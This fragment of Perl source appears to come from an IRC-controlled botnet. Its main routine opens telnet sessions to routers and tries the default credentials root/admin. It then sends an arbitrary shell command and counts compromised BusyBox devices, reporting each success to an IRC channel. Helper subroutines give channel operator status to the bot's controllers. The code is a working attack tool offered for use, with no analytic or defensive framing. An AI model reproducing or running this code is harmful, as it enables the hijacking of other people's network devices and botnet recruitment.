    my($ipexp,$sock,$section,$where)=@_;
    my $sock = $_[1];
#   $sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>$ipexp,PeerPort=>"23");
#	$sock->autoflush(5);
	my $command="NULL";
	my $MAX_BUFF = 9999;
	$debug="|";
	$esci=0;
	msg($where,$section,"Exploiting Start To:7 $ipexp"); 
#	while($esci == 0)
	{
                   $user = $sock -> recv($command,$MAX_BUFF);
                   $debug.=$command;
                   print $sock "root\r\n";
                        $user = $sock -> recv($command,$MAX_BUFF);
                        $debug.=$command;
                        print $sock "admin\r\n";
                        $user = $sock -> recv($command,$MAX_BUFF);
                        $debug.=$command;
                        print $sock "Y\r\n";
                       # printf "\nDebug -->".$debug; 
                   if($debug =~ /name/)
                   {
                         msg($where,$section,"BuG Found to -->:7 $ipexp "); 
                         close($sock);
                         $command = "EXIT";
                         $esci=1;
                   }else
                   {
                        
                        $user = $sock -> recv($command,$MAX_BUFF);
                        $debug.=$command;
                        print $sock $cmd."\r\n";
                        $user = $sock -> recv($command,$MAX_BUFF);
                        $debug.=$command;
                        print $sock "exit\r\n";
                        sleep(50);
                        $user = $sock -> recv($command,$MAX_BUFF);
                        $debug.=$command;
                        printf "---".$a;
                        printf "\nDebug -->".$debug; 
                        $esci=1;                       
                        if(($debug =~ /BusyBox/) || ($debug =~ /directory/) || ($debug =~ /kait/))
                        {
                             msg($where,$section,"Login To:7 $ipexp 9OKI");      
                             msg($where,$section,"Send to shell -> 7$cmd 9OKI");  
                             $totexp++;
                             $debug="|";
                        }else
                        {
                           msg($where,$section,"Login To:7 $ipexp 4FaiLeD! Other Router?"); 
                           $debug="|"; 
                        } 
                        $command = "EXIT";
                        $esci=1;
                   }  
    }          
 }

sub secure(){
	my $uz=$_[0];

	foreach my $c(@canali){
		my ($c,$p)=split(/\|/,$c);
		if($botz[1] eq $nick){
			printf $socket "MODE $c +o $uz\n";
		} else {
		
		}
	}

}

sub secure_chan(){
	my $uz=$_[0];
	my $c=$_[1];
	printf $socket "MODE $c +o $uz\n";
}

